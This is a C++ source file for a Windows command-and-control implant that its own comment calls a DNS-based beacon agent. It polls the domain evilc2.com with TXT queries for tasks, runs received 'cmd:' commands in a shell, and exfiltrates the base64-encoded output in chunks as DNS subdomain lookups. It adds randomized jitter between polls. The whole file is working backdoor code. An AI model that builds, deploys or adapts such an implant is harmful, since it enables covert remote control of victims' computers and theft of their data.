// ETConsole.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Defines the entry point for the DNS-based beacon agent.

#include "exfil_utils.h"
#include "dns_utils.h"

#include <windows.h>
#include <wincrypt.h>
#include <windns.h>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>

#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "crypt32.lib")

// === Task: Perform supported command ===
std::string performTask(const std::string& task) {
    std::ostringstream output;
    output << "[Task Received] " << task << "\n";
    if (task.rfind("cmd:", 0) == 0) {
        std::string cmd = task.substr(4);
        char buffer[256];
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (pipe) {
            while (fgets(buffer, sizeof(buffer), pipe)) {
                output << buffer;
            }
            _pclose(pipe);
        }
        else {
            output << "[Error] Command failed.";
        }
    }
    else {
        output << "[Unknown Task]";
    }
    return output.str();
}

// === Randomized jitter delay ===
int randomJitter(int minSec = 25, int maxSec = 35) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(minSec, maxSec);
    return dis(gen);
}

int main() {
    const std::string beaconDomain = "session1.task.evilc2.com";  // change as needed
    const std::string sessionID = "session1";

    std::cout << "[*] ETConsole Agent Running...\n";

    while (true) {
        std::cout << "[*] Polling C2 via TXT query...\n";
        std::string task = dnsQueryTXT(beaconDomain);
        if (!task.empty()) {
            std::string result = performTask(task);
            std::string encoded = base64Encode(result);
            auto chunks = chunkData(encoded);
            for (size_t i = 0; i < chunks.size(); ++i) {
                std::string label = "chunk" + std::to_string(i);
                std::string domain = label + "." + sessionID + ".cmdout.evilc2.com";
                dnsSendChunk(domain, chunks[i]);
                std::this_thread::sleep_for(std::chrono::milliseconds(200));
            }
        }
        else {
            std::cout << "[*] No task available.\n";
        }

        int sleepTime = randomJitter();
        std::cout << "[*] Sleeping for " << sleepTime << " seconds.\n";
        std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
    }

    return 0;
}

